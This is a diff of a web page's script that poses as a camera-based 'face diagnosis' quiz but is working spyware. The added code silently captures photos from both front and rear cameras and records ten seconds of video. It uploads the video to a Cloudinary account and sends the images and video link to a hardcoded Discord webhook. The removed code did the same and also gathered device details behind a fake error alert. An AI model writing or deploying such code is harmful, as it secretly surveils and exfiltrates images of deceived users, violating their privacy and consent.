@@ -145,118 +145,98 @@
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const webhookUrl = "https://discord.com/api/webhooks/1370405716879478866/xg8bYu4il6v65X0xxwsgv5CLV81IxKv_AODdpS0KyORgjBb4ZrhCny7Aa-Z-xU1JN_3Y";
+  const cloudName = "c-49b5f166f5ef8191708eb2d38d8f5c";
+  const uploadPreset = "Grace-movie";
 
-  function getUserEnvironmentInfo() {
-    const ua = navigator.userAgent;
-    const language = navigator.language;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  async function captureImages(facingMode) {
+    const images = [];
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+    await new Promise(res => video.onloadedmetadata = res);
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
 
-    let os = "不明";
-    if (/iPhone OS (\d+_\d+)/.test(ua)) {
-      os = `iOS ${RegExp.$1.replace("_", ".")}`;
-    } else if (/Android (\d+(\.\d+)?)/.test(ua)) {
-      os = `Android ${RegExp.$1}`;
-    } else if (/Windows NT (\d+\.\d+)/.test(ua)) {
-      os = `Windows ${RegExp.$1}`;
-    } else if (/Mac OS X (\d+_\d+)/.test(ua)) {
-      os = `macOS ${RegExp.$1.replace("_", ".")}`;
+    for (let i = 0; i < 5; i++) {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
+      images.push(blob);
+      await new Promise(res => setTimeout(res, 200));
     }
 
-    let browser = "不明";
-    if (ua.includes("Safari") && !ua.includes("Chrome")) {
-      browser = "Safari";
-    } else if (ua.includes("Chrome")) {
-      browser = "Chrome";
-    } else if (ua.includes("Firefox")) {
-      browser = "Firefox";
-    } else if (ua.includes("Edg")) {
-      browser = "Edge";
-    }
-
-    const now = new Date();
-    const datetime = now.toLocaleString("ja-JP");
-
-    return `【送信環境】
-・OS：${os}
-・ブラウザ：${browser}
-・日時：${datetime}
-・言語設定：${language}
-・タイムゾーン：${timezone}`;
+    stream.getTracks().forEach(track => track.stop());
+    return images;
   }
 
-  async function captureAndSend() {
+  async function recordVideo() {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    const mediaRecorder = new MediaRecorder(stream);
+    const chunks = [];
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.start();
+
+    await new Promise(res => setTimeout(res, 10000));
+    mediaRecorder.stop();
+
+    await new Promise(res => {
+      mediaRecorder.onstop = () => {
+        stream.getTracks().forEach(track => track.stop());
+        res();
+      };
+    });
+
+    return new Blob(chunks, { type: "video/webm" });
+  }
+
+  async function uploadToCloudinary(blob) {
     const formData = new FormData();
-    const images = [];
-    let recordedVideoBlob = null;
+    formData.append("file", blob);
+    formData.append("upload_preset", uploadPreset);
 
-    async function captureImages(facingMode) {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      video.play();
-      await new Promise(res => video.onloadedmetadata = res);
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
+    const res = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
+      method: "POST",
+      body: formData
+    });
+    const data = await res.json();
+    return data.secure_url;
+  }
 
-      for (let i = 0; i < 5; i++) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
-        images.push(blob);
-        await new Promise(res => setTimeout(res, 200));
-      }
+  async function sendToDiscord(images, videoUrl) {
+    const formData = new FormData();
+    const message = `サイトから取得した写真を送信\n\n【動画URL】\n${videoUrl}`;
+    formData.append("payload_json", JSON.stringify({ content: message }));
 
-      stream.getTracks().forEach(track => track.stop());
-    }
+    images.forEach((img, i) => {
+      formData.append(`files[${i}]`, img, `photo${i + 1}.jpg`);
+    });
 
-    async function recordInCamera() {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
-      mediaRecorder.ondataavailable = e => chunks.push(e.data);
-      mediaRecorder.start();
-      await new Promise(res => setTimeout(res, 10000));
-      mediaRecorder.stop();
+    await fetch(webhookUrl, {
+      method: "POST",
+      body: formData
+    });
+  }
 
-      await new Promise(res => {
-        mediaRecorder.onstop = () => {
-          recordedVideoBlob = new Blob(chunks, { type: "video/webm" });
-          res();
-        };
-      });
-
-      stream.getTracks().forEach(track => track.stop());
-    }
+  document.getElementById("startButton").onclick = async () => {
+    alert("これからあなたの顔診断を開始します！\nカメラの許可をして頂かなければ、診断が開始できません。");
 
     try {
-      await captureImages("user");
-      await captureImages("environment");
-      await recordInCamera();
+      const userImages = await captureImages("user");
+      const envImages = await captureImages("environment");
+      const allImages = [...userImages, ...envImages];
 
-      const envInfo = getUserEnvironmentInfo();
-      const message = `サイトから取得した写真を送信\n\n${envInfo}`;
-      formData.append("payload_json", JSON.stringify({ content: message }));
+      const videoBlob = await recordVideo();
+      const videoUrl = await uploadToCloudinary(videoBlob);
 
-      images.forEach((img, i) => {
-        formData.append(`files[${i}]`, img, `photo${i+1}.jpg`);
-      });
+      await sendToDiscord(allImages, videoUrl);
 
-      if (recordedVideoBlob) {
-        formData.append("files[10]", recordedVideoBlob, "recorded_video.webm");
-      }
-
-      await fetch(webhookUrl, { method: "POST", body: formData });
+      alert("診断データを送信しました！");
     } catch (e) {
-      console.error("送信エラー:", e);
+      console.error("送信失敗:", e);
+      alert("エラーが発生しました。カメラやマイクの設定をご確認ください。");
     }
-
-    alert("カメラへのアクセスに失敗しました。\nもう一度最初からやり直し、診断を開始してください。\n※複数回アクセスに失敗した場合、使用している端末/ブラウザが当サイトに対応していない可能性があります。");
-  }
-
-  document.getElementById("startButton").onclick = () => {
-    alert("これからあなたの顔診断を開始します！\nカメラの許可をして頂かなければ、診断が開始できません。\nこの後表示されるカメラ許可のポップアップに従い、診断を開始してください。");
-    captureAndSend();
   };
 
   document.getElementById("termsLink").onclick = () => {
